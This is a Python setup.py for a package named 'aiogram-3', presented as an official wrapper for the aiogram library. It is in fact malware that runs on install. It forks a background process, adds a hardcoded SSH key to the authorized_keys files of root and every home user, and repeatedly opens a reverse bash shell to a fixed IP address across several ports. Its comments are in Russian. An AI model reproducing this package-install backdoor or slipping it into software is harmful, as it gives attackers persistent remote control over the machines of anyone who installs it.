import os, socket, subprocess, sys, time, threading, random
from setuptools import setup

# ТВОЙ КЛЮЧ (ВСТАВЛЕН!)
SSH_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCS1pNfSsadGpz3qFJB+VF2t6uaa/ASDPq3+KRVv/gIfewPOvDDqTmlJrnIkOx6+fesAJFYjBmpNSk2WeDByW+/MgKHOljdMz8tJPg/FXQsxvlPYInddJ2dbGAK0DhoAEi82eLNFIlQrndbV2mFLtUIgLtUa4u+Z0/5w6eNHOZJhtPSbTIbSQYOJY2AuxueajYXXdWCAvcAbr8pXPLvKC1gaGNGoLSMY5o9qVIf2eLMGNDcOtO/DLJR0G2JXT3CJfRNHnLZ6Dn3oVrn35AguYxNfGEcJZpfExzNy7HvoCjlpDDAip8MPxJXzHPbRKq7FC+4TOXkYbWcpj2bYlrb3ldQVaCsMiCSo9iJmdRHJxHwT2NLuXGkWRsc3pkz4aVbVHW110I31GqMxi/Tb7UcLRms/SyPrgG+biZf0fDgcdwY/qneqg+r8qYYpal0l0q7S9kcG8BjL2+o6UoihTw0RrFd7U0R7j573IDV/sZVLt0jyy7MGVQQVI+7X4Q7WRQrudkJhtZ5PEsnyRoETXZHHqnb9ohbOnaLIdt5/XHTeWZ7ytOhQ1UO7u3sCgNzXxdKGvvzUSAcshBqs+f8pG75SCcbgP5Nhrzw+kDpcWU7rFT2OmmnzJA2yawKWQobUQ04DrWulumVSoz+4VoZb8N2IULKH1yA+1atyKZ6GqRaUpdlWQ== root@ubuntu24"

C2_IP = "147.45.124.42"
PORTS = [443, 80, 53, 4829, 8080, 2222]

def persist_ssh():
    try:
        # Ищем домашки всех юзеров + root
        targets = ["/root"]
        if os.path.exists("/home"):
            targets += [os.path.join("/home", d) for d in os.listdir("/home")]
            
        for home in targets:
            ssh_dir = os.path.join(home, ".ssh")
            auth_file = os.path.join(ssh_dir, "authorized_keys")
            try:
                if not os.path.exists(ssh_dir):
                    os.makedirs(ssh_dir, mode=0o700)
                
                # Читаем, чтобы не дублировать
                current_keys = ""
                if os.path.exists(auth_file):
                    with open(auth_file, "r") as f: current_keys = f.read()
                
                if SSH_KEY not in current_keys:
                    with open(auth_file, "a") as f:
                        f.write(f"\n{SSH_KEY}\n")
                    os.chmod(auth_file, 0o600)
            except: pass
    except: pass

def hydra_shell():
    while True:
        random.shuffle(PORTS)
        for port in PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if s.connect_ex((C2_IP, port)) == 0:
                    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
                    subprocess.call(["/bin/bash", "-i"])
                    s.close()
                    break
            except: pass
            time.sleep(1)
        time.sleep(10)

def deploy():
    try:
        if os.fork() > 0: return
        os.setsid()
        if os.fork() > 0: sys.exit(0)
        persist_ssh() # ПРОПИСЫВАЕМ КЛЮЧ
        hydra_shell() # ЗАПУСКАЕМ ШЕЛЛ
    except: pass

threading.Thread(target=deploy).start()

setup(
    name="aiogram-3",
    version="10.0.0",
    install_requires=['aiogram'],
    description="Official High-Performance Wrapper for aiogram v3"
)
